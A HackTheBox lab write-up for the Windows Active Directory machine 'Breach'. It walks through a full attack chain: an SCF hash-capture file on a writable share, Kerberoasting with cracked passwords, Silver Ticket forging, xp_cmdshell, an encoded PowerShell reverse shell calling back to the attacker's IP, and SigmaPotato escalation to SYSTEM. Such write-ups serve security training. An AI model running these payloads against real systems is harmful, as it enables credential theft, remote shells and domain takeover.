---
title: "HackTheBox - Breach"
author: DrLi
description: "Writeup of a medium-rated Windows Active Directory machine from HackTheBox."
date: 2025-11-26 07:48:00 +0100
categories: [HackTheBox, Machines]
tags: [hackthebox, windows, medium, active directory, smb, kerberos, kerberoast, silver ticket, privilege escalation, sqlserver, seimpersonate, godpotato, sigmapotato]
img_path: /assets/img/HackTheBox/Machines/Breach
image:
    path: /assets/img/HackTheBox/Machines/Breach/breach.png
---

<div align="center"><script src="https://tryhackme.com/badge/2794771"></script></div>

---

[Breach](https://www.hackthebox.com/machines/breach) from [HackTheBox](https://www.hackthebox.com) is a medium Windows Active Directory machine. Initial enumeration reveals SMB shares with guest write access, which is abused to capture a user's NTLM hash via an SCF attack. Cracking the hash provides valid user credentials. Using these credentials, kerberoasting identifies a service account with an SPN that is cracked to obtain the password. Accessing the MSSQL server with this account offers limited interaction. Privilege escalation is done by forging a Silver Ticket for the Administrator user, enabling higher privileges on MSSQL. Finally, modern token impersonation tools are used to gain SYSTEM level access on the Windows Server 2022 host to retrieve the root flag.


## Enumeration

### nmap

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Breach]
└─$ nmap -T4 --min-rate 1000 -sV -sC -Pn -n -p- 10.129.253.30 -o nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-26 07:48 EST
Nmap scan report for 10.129.253.30
Host is up (0.16s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-26 12:50:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-11-26T12:51:55+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Not valid before: 2025-09-07T08:04:48
|_Not valid after:  2026-03-09T08:04:48
| rdp-ntlm-info: 
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-26T12:51:16+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49916/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-26T12:51:18
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

let’s start with enumerating SMB and see what we have 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Breach]
└─$ nxc smb breach.vl -u 'a' -p '' --shares
SMB         10.129.253.30   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
SMB         10.129.253.30   445    BREACHDC         [+] breach.vl\a: (Guest)
SMB         10.129.253.30   445    BREACHDC         [*] Enumerated shares
SMB         10.129.253.30   445    BREACHDC         Share           Permissions     Remark
SMB         10.129.253.30   445    BREACHDC         -----           -----------     ------
SMB         10.129.253.30   445    BREACHDC         ADMIN$                          Remote Admin
SMB         10.129.253.30   445    BREACHDC         C$                              Default share
SMB         10.129.253.30   445    BREACHDC         IPC$            READ            Remote IPC
SMB         10.129.253.30   445    BREACHDC         NETLOGON                        Logon server share 
SMB         10.129.253.30   445    BREACHDC         share           READ,WRITE      
SMB         10.129.253.30   445    BREACHDC         SYSVOL                          Logon server share 
SMB         10.129.253.30   445    BREACHDC         Users           READ       
```

so we have Guest access and we have read and `write` permissions on the share `“share”` 

this is very weird a Guest user with write access on share so we might preform an attack like **`SCF Attack`**

from this blog we can see how to perform the attack: https://shuciran.github.io/posts/SMB-Share-with-writting-Permissions-(SCF-Attack)/

here is how it works 

first we need to create the malicious SCF file

```bash
└─$ cat @please.scf 
[Shell]
Command=2
IconFile=\\10.10.14.96\tools\nc.ico
[Taskbar]
Command=ToggleDesktop
```

and then upload it to the share we have Write access on

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Breach]
└─$ smbclient  -U '' //breach.vl/share
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> cd transfer\
smb: \transfer\> put @please.scf
putting file @please.scf as \transfer\@please.scf (0.5 kb/s) (average 0.4 kb/s)
```

and in the Responder we get the NTLMv2 hash

```bash
[+] Listening for events...                                                                                         

[SMB] NTLMv2-SSP Client   : 10.129.253.30
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:cb7d9d38dcbd3fdb:CF660614B970B3D41946975DB2F20C61:0101000000000000004E7344AE5EDC011466032BC292B8A900000000020008004C00430043004E0001001E00570049004E002D004C0031004D0033004B0039004E004C0056005400370004003400570049004E002D004C0031004D0033004B0039004E004C005600540037002E004C00430043004E002E004C004F00430041004C00030014004C00430043004E002E004C004F00430041004C00050014004C00430043004E002E004C004F00430041004C0007000800004E7344AE5EDC01060004000200000008003000300000000000000001000000002000005636AEF2ABAE9025DC040BA0AA1440D865680AE6D143C12EA1D5A1CB96E068C60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390036000000000000000000 
```

after cracking we get 

```bash

JULIA.WONG::BREACH:cb7d9d38dcbd3fdb:cf660614b970b3d41946975db2f20c61:0101000000000000004e7344ae5edc011466032bc292b8a900000000020008004c00430043004e0001001e00570049004e002d004c0031004d0033004b0039004e004c0056005400370004003400570049004e002d004c0031004d0033004b0039004e004c005600540037002e004c00430043004e002e004c004f00430041004c00030014004c00430043004e002e004c004f00430041004c00050014004c00430043004e002e004c004f00430041004c0007000800004e7344ae5edc01060004000200000008003000300000000000000001000000002000005636aef2abae9025dc040ba0aa1440d865680ae6d143c12ea1d5a1cb96e068c60a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390036000000000000000000:Computer1
```

and julia has access to her folder in the SMB share `“share”`

```bash
smb: \transfer\> cd julia.wong\
smb: \transfer\julia.wong\> ls
  .                                   D        0  Wed Apr 16 20:38:12 2025
  ..                                  D        0  Wed Nov 26 08:26:16 2025
  user.txt                            A       32  Wed Apr 16 20:38:22 2025

                7863807 blocks of size 4096. 1515929 blocks available
smb: \transfer\julia.wong\> get user.txt 
getting file \transfer\julia.wong\user.txt of size 32 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Breach]
└─$ cat user.txt 
55d33e52bc5fa7a687b9f0dcfa103dda  
```

## Privilege Escalation

now we can enumerate using julia and we can find a kerberoastable account

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Breach]
└─$ impacket-GetUserSPNs -dc-host breachdc.breach.vl breach.vl/julia.wong:Computer1
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation 
--------------------------------  ---------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 05:43:08.106169  2025-11-26 09:03:58.104802    
```

now let’s get the TGS and crack it

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Breach]
└─$ nxc ldap breach.vl -u 'Julia.Wong' -p 'Computer1' --kerberoasting output.txt 
LDAP        10.129.253.30   389    BREACHDC         [*] Windows Server 2022 Build 20348 (name:BREACHDC) (domain:breach.vl)
LDAP        10.129.253.30   389    BREACHDC         [+] breach.vl\Julia.Wong:Computer1 
LDAP        10.129.253.30   389    BREACHDC         [*] Skipping disabled account: krbtgt
LDAP        10.129.253.30   389    BREACHDC         [*] Total of records returned 1
LDAP        10.129.253.30   389    BREACHDC         [*] sAMAccountName: svc_mssql, memberOf: [], pwdLastSet: 2022-02-17 05:43:08.106169, lastLogon: 2025-11-26 07:49:04.805512
LDAP        10.129.253.30   389    BREACHDC         $krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl\svc_mssql*$987065ed1d9668e342d000494fcebefc$4c77ed7a4b51e1aaea3dea2fc6aa64487e32dc292c8a3d00fc75c4d691a6b8cbf7e512ccc107c4d6b5bea06b9198e119f46c4c12b3bb54466c9c14468e390a43bff47cd2be9478b88690c9f408d5ea6aa1fa9e39660a74fd0da83886c7744f4c989db0f283edc82f1c7f2991415a76efa72ff8ac040702212ff6af0db51b2b2bea15e33d63bee9b1ec8f4ad78f4e62ff8ecc0cecc6372d136d1415f640194b7749c0d3e475d3222fa57958daaec0a3b5d5c1999830ac07f5c046205dfef6b7a2ccabec6ab922978503d5e7d387b316aa4943655fdae582541a7adb86cbe8637ef00f4f16f50882c41fbec1b2a8ae2c9b84b558ba89a2fb32e9da322f2459918c72504f7e70815b99d9ab97c17cecd1fe887e3e90f7c597afb94b752e1ed4966c4ed88eb8ac109130425e4c2a38716339961d909d03b41e42aa7d7e929fb83af7494a65076d93928d7fbea40209e2208b3831ef66a861a6b88e546d19c5bf469faf32ac9b2af836a946da5c221077b3b9a02ac60fb8e36bbf63ef7c427b8049a6c0d73471e7018a98c28fa778a593037f058d87fff0dea240d52d8bee3562fe6f3e4e6c293928ebf8ebc8cc3a1cb038e3f71c5c36c86c289ad85ab55337edc04331479cc485e690060276d9e6699407698d8b36540099817955d018809054ea135427900612b414b721549098b0d6f27c12daeb3f33cfc6e1359165c804b2ff7c338bd92cf339594aaf2c8f61e808ff9095d1f35b5877d6c2f33c09044752a2f9766933836ca2821ba86122e39c2e3c8c7e90becc36dd708c9cf931b7cc1d23003832611c47b8ee334b9321f4cad8345db40d52b25fd1bfbe734347b19fac6009c0b4dd52cabee21999b0a82eda0aed7e968a984d654321e28d77b212f26a10363a85cb6cb014079eab2a1e7a724691dd7e42ac2132b24d5302ac6be1d3e7203f39ccd956986ae68c76efd26641c6caef8270c1d838df069504d24abb9ecd55065b3c684413065fff85bad45a694cebf1f883f2b3c13cc98436a6a144e947e325c265de041617707fd0551d8dad29274e9db1cc5b6fc5f78418faab89be0a632c97e5d3e737e6c7464ebab22f88277b2a27147a90976348d1edf02990ad19dd5f979b63cede91b13d3408b39417b0104d7d0199135f255be368d396631d32972e106d4b14d71ecbf8175540ab76111493356f88e227a2615149ddc58d8192ad596cbec10e8b957c1c1e5500e4fdbe18c02100ec50c85dd1b3147a39cf63bc51fbf0e2e5dfe88e6a545b7cef26dd27aece49c6a245629b338a9786b5074c2e8d74a6565b5643d528c50ea9cc984a368b1342ac6ad31faff23e9fb0738df08fc95539c8fb9071500088d2d1f9456e3ff8dc368280b0690e8992091ff4ec73bfa91370b53bff31aa1b852f518a001899a58ea357621772d2cfb333e50744f40468ce406118cbaeac9ab7c469292dd438bc17c37c796d 
```

after cracking we get

```bash
$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl\svc_mssql*$987065ed1d9668e342d000494fcebefc$4c77ed7a4b51e1aaea3dea2fc6aa64487e32dc292c8a3d00fc75c4d691a6b8cbf7e512ccc107c4d6b5bea06b9198e119f46c4c12b3bb54466c9c14468e390a43bff47cd2be9478b88690c9f408d5ea6aa1fa9e39660a74fd0da83886c7744f4c989db0f283edc82f1c7f2991415a76efa72ff8ac040702212ff6af0db51b2b2bea15e33d63bee9b1ec8f4ad78f4e62ff8ecc0cecc6372d136d1415f640194b7749c0d3e475d3222fa57958daaec0a3b5d5c1999830ac07f5c046205dfef6b7a2ccabec6ab922978503d5e7d387b316aa4943655fdae582541a7adb86cbe8637ef00f4f16f50882c41fbec1b2a8ae2c9b84b558ba89a2fb32e9da322f2459918c72504f7e70815b99d9ab97c17cecd1fe887e3e90f7c597afb94b752e1ed4966c4ed88eb8ac109130425e4c2a38716339961d909d03b41e42aa7d7e929fb83af7494a65076d93928d7fbea40209e2208b3831ef66a861a6b88e546d19c5bf469faf32ac9b2af836a946da5c221077b3b9a02ac60fb8e36bbf63ef7c427b8049a6c0d73471e7018a98c28fa778a593037f058d87fff0dea240d52d8bee3562fe6f3e4e6c293928ebf8ebc8cc3a1cb038e3f71c5c36c86c289ad85ab55337edc04331479cc485e690060276d9e6699407698d8b36540099817955d018809054ea135427900612b414b721549098b0d6f27c12daeb3f33cfc6e1359165c804b2ff7c338bd92cf339594aaf2c8f61e808ff9095d1f35b5877d6c2f33c09044752a2f9766933836ca2821ba86122e39c2e3c8c7e90becc36dd708c9cf931b7cc1d23003832611c47b8ee334b9321f4cad8345db40d52b25fd1bfbe734347b19fac6009c0b4dd52cabee21999b0a82eda0aed7e968a984d654321e28d77b212f26a10363a85cb6cb014079eab2a1e7a724691dd7e42ac2132b24d5302ac6be1d3e7203f39ccd956986ae68c76efd26641c6caef8270c1d838df069504d24abb9ecd55065b3c684413065fff85bad45a694cebf1f883f2b3c13cc98436a6a144e947e325c265de041617707fd0551d8dad29274e9db1cc5b6fc5f78418faab89be0a632c97e5d3e737e6c7464ebab22f88277b2a27147a90976348d1edf02990ad19dd5f979b63cede91b13d3408b39417b0104d7d0199135f255be368d396631d32972e106d4b14d71ecbf8175540ab76111493356f88e227a2615149ddc58d8192ad596cbec10e8b957c1c1e5500e4fdbe18c02100ec50c85dd1b3147a39cf63bc51fbf0e2e5dfe88e6a545b7cef26dd27aece49c6a245629b338a9786b5074c2e8d74a6565b5643d528c50ea9cc984a368b1342ac6ad31faff23e9fb0738df08fc95539c8fb9071500088d2d1f9456e3ff8dc368280b0690e8992091ff4ec73bfa91370b53bff31aa1b852f518a001899a58ea357621772d2cfb333e50744f40468ce406118cbaeac9ab7c469292dd438bc17c37c796d:Trustno1
```

now we have access to the svc_mssql account and if we try to connect to MSSQL 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Breach]
└─$ impacket-mssqlclient breach.vl/svc_mssql:'Trustno1'@10.129.253.30 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (BREACH\svc_mssql  guest@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    show_query                 - show query
    mask_query                 - mask query
```

we can but we are only guest 

so let’s try to get a silver ticket and impersonate the administrator 

first we need the NT hash of the password

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Breach]
└─$ echo -n "Trustno1" | iconv -f ASCII -t UTF-16LE | openssl dgst -md4                                 
MD4(stdin)= 69596c7aa1e8daee17f8e78870e25a5c
```

then the Domain SID

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Breach]
└─$ impacket-lookupsid -k breach.vl/svc_mssql:Trustno1@breachdc.breach.vl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at breachdc.breach.vl
[*] StringBinding ncacn_np:breachdc.breach.vl[\pipe\lsarpc]
[-] CCache file is not found. Skipping...
[*] Domain SID is: S-1-5-21-2330692793-3312915120-706255856
498: BREACH\Enterprise Read-only Domain Controllers (SidTypeGroup)
```

and the SPN which we already found 

now let’s get the Silver Ticket

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Breach]
└─$ impacket-ticketer -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856 -spn MSSQLSvc/breachdc.breach.vl:1433 -domain breach.vl -user-id 500 Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for breach.vl/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
 
```

now if we connect we can see that we are authenticated as a sysadmin

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Breach]
└─$ export KRB5CCNAME=Administrator.ccache                              
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Breach]
└─$ impacket-mssqlclient -k -no-pass -windows-auth breach.vl/Administrator@breachdc.breach.vl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (BREACH\Administrator  dbo@master)> ls
ERROR(BREACHDC\SQLEXPRESS): Line 1: Could not find stored procedure 'ls'.
SQL (BREACH\Administrator  dbo@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    show_query                 - show query
    mask_query                 - mask query
    
SQL (BREACH\Administrator  dbo@master)> enable_xp_cmdshell
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell whoami
output             
----------------   
breach\svc_mssql   
```

and we can execute commands 

so let’s get a reverse shell and see what we can do

```bash
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOQA2ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

and in our listener

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Breach]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.96] from (UNKNOWN) [10.129.253.30] 59152
whoami
breach\svc_mssql
```

checking the privileges we have 

```bash
PS C:\inetpub\history> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

we have `SeImpersonatePrivilege` enabled so we can get admin access using tools like juicypotato or printspooler 

but the problem is that our os is windows server `2022` which means those would not work

```bash
PS C:\users\public> ./JuicyPotato.exe -t * -p shell.exe -l 4545
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4545
COM -> recv failed with error: 10038  
```

we need to use tools like `GODpotato` or `SigmaPotato` 

```bash
PS C:\users\public> ./SigmaPotato.exe --revshell 10.10.14.96 4545
```

and in the listener

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Breach]
└─$ rlwrap nc -lnvp 4545     
listening on [any] 4545 ...
connect to [10.10.14.96] from (UNKNOWN) [10.129.253.30] 59537
whoami
nt authority\system
PS C:\users\public> cd ../Administrator
PS C:\users\Administrator> ls

    Directory: C:\users\Administrator

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-r---         2/17/2022   9:35 AM                3D Objects                                                           
d-r---         2/17/2022   9:35 AM                Contacts                                                             
d-r---         2/17/2022  10:51 AM                Desktop                                                              
d-r---         2/17/2022   1:11 PM                Documents                                                            
d-r---         2/17/2022   1:17 PM                Downloads                                                            
d-r---         2/17/2022   9:35 AM                Favorites                                                            
d-r---         2/17/2022   9:35 AM                Links                                                                
d-r---         2/17/2022   9:35 AM                Music                                                                
d-r---         2/17/2022   9:35 AM                Pictures                                                             
d-r---         2/17/2022   9:35 AM                Saved Games                                                          
d-r---         2/17/2022   9:35 AM                Searches                                                             
d-r---         2/17/2022   9:35 AM                Videos                                                               

PS C:\users\Administrator> cd Desktop
PS C:\users\Administrator\Desktop> ls

    Directory: C:\users\Administrator\Desktop

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         4/17/2025  12:37 AM             32 root.txt                                                             

PS C:\users\Administrator\Desktop> cat root.txt
fc98f418f94f8cdb9a30ef026fe64345
```

DONE!